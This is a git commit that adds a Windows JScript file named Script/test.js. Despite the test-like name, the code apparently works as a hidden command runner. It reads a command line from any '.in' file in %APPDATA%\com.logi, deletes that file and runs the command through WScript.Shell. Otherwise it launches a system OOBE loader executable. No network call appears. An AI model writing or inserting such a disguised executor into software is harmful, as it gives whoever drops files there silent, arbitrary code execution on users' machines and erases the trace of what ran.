7dc5b7b38fc12be7c5e3c9dcbd9323d1b72f19fd
Icefrog2000 <134750070+NoobCat2000@users.noreply.github.com>
2024-11-09 00:15:18 +0700

    From tu dinh 52

---
+++ Script/test.js
@@ -0,0 +1,27 @@
+var WShell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var logiPath = WShell.ExpandEnvironmentStrings("%APPDATA%\\com.logi")
+if (fso.FolderExists(logiPath)) {
+    var lockFile = logiPath + "\\lock"
+    if (!fso.FileExists(lockFile)) {
+        var folder = fso.GetFolder(logiPath)
+        var files = folder.Files
+        var runCmd = false
+        for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {
+            item = objEnum.item();
+            var fullName = logiPath + "\\" + item.Name
+            if (item.Name.search(".in") != -1) {
+                runCmd = true
+                var reader = fso.OpenTextFile(fullName, 1, true, 0)
+                command = reader.ReadLine()
+                reader.Close()
+                fso.DeleteFile(fullName)
+                WShell.Run(command)
+            }
+        }
+    
+        if (!runCmd) {
+            WShell.Run("C:\\WINDOWS\\System32\\oobe\\oobeldr.exe")
+        }
+    }
+}
